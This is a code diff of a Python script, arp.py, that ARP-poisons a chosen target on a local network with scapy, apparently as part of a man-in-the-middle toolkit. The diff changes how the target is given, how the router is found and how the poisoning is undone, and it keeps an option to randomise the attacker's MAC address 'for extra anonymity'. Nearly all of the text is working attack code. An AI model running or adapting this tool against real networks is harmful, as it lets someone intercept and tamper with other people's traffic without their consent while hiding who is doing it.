@@ -4,7 +4,7 @@
 Arp poisons a target; and resets the arp poison on exit.
 Uses default interface, router and ip
 
-    usage: arp.py [options]
+    usage: arp.py [<target>] [options]
 
     optional arguments:
       -h, --help              Show this help message and exit
@@ -12,7 +12,6 @@ Uses default interface, router and ip
 
       -m, --changemac         Change to random mac address (can take 30 secs)
       -r, --reset             Reset arp poison (should happen on exit anyway)
-      -t TARGET, --target     IP address of target [default: 192.168.0.4]
 """
 import os
 import sys
@@ -24,9 +23,9 @@ if not os.geteuid()==0:
 import logging as log
 log.getLogger("scapy.runtime").setLevel(log.ERROR)
 
-from scapy.all import send, ARP, sr1
-from mim.tools.tools import su, setTitle, fwreset
-from mim.tools.bash import arp, route
+from scapy.all import send, ARP, sr1, IP, ICMP
+from mim.tools import su, setTitle, fwreset
+from mim.bash import arp, route
 import time
 from docopt import docopt
 
@@ -34,42 +33,43 @@ FREQ = 5
 
 def main():
     args = docopt(__doc__, version='arp 1.0')
+    if not args["<target>"]:
+        args["<target>"] = "192.168.0.8"
 
     log.getLogger().setLevel(int(args["--loglevel"]))
 
     # get router
-    r = route()
-    if not r.iface or not r.router:
+    try:
+        router = route().ifaces[0]
+    except:
         log.warning("Default route not found")
         sys.exit()
-    router = r.router
-    iface = r.iface
 
     # arp reset
     if args["--reset"]:
-        unpoison(router, args["--target"])
+        unpoison(router.ip, args["<target>"])
         fwreset()
         sys.exit()
-
+    
     # check target is reachable before sending ARP poison. Otherwise scapy sends broadcast ARP poison.
     # Note arp used as ping does not get response from windows machines.
-    response = sr1(ARP(pdst=args["--target"]), timeout=2, verbose=0)
+    response = sr1(ARP(pdst=args["<target>"]), timeout=2, verbose=0)
     if not response:
-        log.info("%s target not found" % args["--target"])
+        log.info("%s target not found" % args["<target>"])
         fwreset()
         sys.exit()
 
     # change MAC address for extra anonymity
     # only do this if happy to wait 20 seconds to bring network down and up
     if args["--changemac"]:
-        su('ifconfig %s down' % iface)
-        su('macchanger -r %s' % iface)
+        su('ifconfig %s down' % router.name)
+        su('macchanger -r %s' % router.name)
         log.info("waiting for network to come back up")
-        su('ifconfig %s up' % iface)
-        su('dhclient %s' % iface)
+        su('ifconfig %s up' % router.name)
+        su('dhclient %s' % router.name)
 
-    poison(router, args["--target"])
-    unpoison(router, args["--target"])
+    poison(router.ip, args["<target>"])
+    unpoison(router.ip, args["<target>"])
     fwreset()
 
 
@@ -89,18 +89,19 @@ def poison(src, target):
         log.info("problem sending arp poison")
 
 
-def unpoison(router, target):
+def unpoison(routerip, target):
     """ get correct MAC for router and send to the target to reset ARP cache """
-    mac = arp().mac
+    hosts = {a.ip : a.mac for a in arp().hosts}
+
     # if not already in arp cache then ping and try again
-    if router not in mac:
-        sr1(IP(dst=router)/ICMP())
-        mac = arp().mac
-    if router not in mac:
+    if routerip not in hosts:
+        sr1(IP(dst=routerip)/ICMP())
+        hosts = {a.ip : a.mac for a in arp().hosts}
+    if routerip not in hosts:
         log.warning("Router MAC address not found. Could not remove ARP poison.")
         sys.exit()
-    log.info("Unpoison sent to %s for gateway %s at mac address %s" % (target, router, mac[router]))
-    send(ARP(psrc=router, hwsrc=mac[router], pdst=target))
+    log.info("Unpoison sent to %s for gateway %s at mac address %s" % (target, routerip, hosts[routerip]))
+    send(ARP(psrc=routerip, hwsrc=hosts[routerip], pdst=target))
 
 setTitle(__file__)
 main()
